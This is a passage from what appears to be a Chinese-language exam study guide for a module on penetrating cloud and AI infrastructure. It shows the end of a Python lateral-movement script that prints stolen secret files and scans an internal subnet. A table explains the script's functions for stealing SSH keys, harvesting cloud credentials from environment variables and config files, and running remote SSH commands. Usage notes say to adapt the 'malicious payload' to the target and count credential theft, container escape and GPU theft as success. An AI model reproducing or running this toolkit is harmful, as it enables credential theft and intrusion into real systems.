        print(f"    Found {len(secrets)} potential secret files:")
        for secret in secrets[:5]:
            print(f"\n    Path: {secret['path']}")
            print(f"    Content: {secret['content'][:80]}")
    
    print("\n[5] Scanning Internal Network")
    print("    Scanning subnet 192.168.1.0/24...")
    alive_hosts = attacker.scan_internal_network()
    if alive_hosts:
        print(f"    ✅ Found {len(alive_hosts)} alive hosts:")
        for host in alive_hosts[:10]:
            print(f"      - {host}")
    else:
        print("    ❌ No alive hosts found")

if __name__ == "__main__":
    main()
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-5 | 导入依赖 | `subprocess`、`os`、`re`、`socket` 用于网络和系统操作 |
| 7-15 | `LateralMovement` 初始化 | 定义SSH密钥路径和常见端口 |
| 9-17 | SSH密钥路径 | 常见的SSH密钥位置 |
| 19-20 | 常见端口 | SSH、HTTP、数据库等端口 |
| 22-42 | `steal_ssh_keys` | 窃取SSH密钥 |
| 25-38 | 读取密钥 | 检查文件是否可读并提取内容 |
| 44-60 | `scan_internal_network` | 扫描内网主机 |
| 48-57 | TCP扫描 | 使用socket扫描22端口 |
| 62-78 | `check_known_hosts` | 检查known_hosts文件 |
| 65-75 | 解析文件 | 提取已知主机列表 |
| 80-92 | `get_environment_variables` | 获取环境变量 |
| 83-88 | 敏感变量 | AWS、Azure、GCP、API密钥等 |
| 94-122 | `extract_secrets_from_files` | 从文件中提取敏感信息 |
| 97-100 | 秘密文件模式 | .env、.key、.pem、配置文件等 |
| 103-118 | 遍历目录 | 查找并读取敏感文件 |
| 124-140 | `execute_ssh_command` | 执行SSH命令 |
| 128-136 | SSH命令构建 | 使用指定密钥执行远程命令 |
| 142-190 | `main` | 主函数：演示横向移动攻击流程 |

---

## 考试使用说明

### 修改要点

1. **云环境端点**：根据实际云厂商修改元数据端点
2. **子网范围**：修改扫描的内网子网范围
3. **存储端点**：修改S3/MinIO端点地址
4. **攻击载荷**：根据目标环境调整恶意代码内容
5. **密钥路径**：根据目标系统修改SSH密钥路径

### 典型工作流

```bash
# 1. 探测云环境元数据
python module-6-infrastructure-penetration.py

# 2. 检查容器环境
# 3. 攻击GPU基础设施
# 4. 枚举存储服务
# 5. 尝试横向移动
# 6. 记录所有漏洞到攻击笔记
```

### 关键成功指标

- **云凭证获取**：成功获取AWS/Azure/GCP凭证
- **容器逃逸**：成功从容器逃逸到宿主机
- **GPU资源窃取**：成功占用GPU计算资源
- **存储访问**：成功读取/写入存储服务
- **横向移动**：成功访问内网其他主机

---

> **文档版本**: v1.0  
> **适用模块**: AI-300 模块六：底层云与AI基础设施渗透  
> **考试重要性**: ⭐⭐⭐⭐⭐